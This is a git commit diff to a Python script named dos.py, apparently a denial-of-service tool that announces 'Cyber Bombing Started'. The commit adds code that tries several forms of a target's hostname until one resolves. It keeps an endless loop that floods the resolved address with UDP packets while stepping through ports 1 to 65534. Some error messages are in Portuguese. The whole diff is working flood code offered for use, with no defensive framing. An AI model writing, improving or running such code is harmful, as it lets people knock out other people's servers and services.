ec8de6764458ff7374b0fe8f8d91dd160f179a85
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-10-22 13:04:28 -0300

    Update dos.py

--- dos.py
+++ dos.py
@@ -28,10 +28,25 @@ os.system("clear")
 os.system("figlet Cyber Bombing Started")
 
 sent = 0
-while True:
-     sock.sendto(bytes, (target, port))
-     sent = sent + 1
-     port = port + 1
-     print("Sent %s packet to %s through port:%s" % (sent, target, port))
-     if port == 65534:
-       port = 1
+success = False
+variations = [target, "www." + target, "http://" + target, "https://" + target]
+
+for variation in variations:
+    try:
+        target_ip = socket.gethostbyname(variation)
+        success = True
+        break
+    except socket.gaierror:
+        print(f"Erro de resolução de nome de host para a variação: {variation}")
+        continue
+
+if success:
+    while True:
+        sock.sendto(bytes, (target_ip, port))
+        sent = sent + 1
+        port = port + 1
+        print(f"Sent {sent} packet to {target_ip} through port:{port}")
+        if port == 65534:
+            port = 1
+else:
+    print("Não foi possível resolver o nome de host. Verifique sua conexão à internet e o nome de host.")
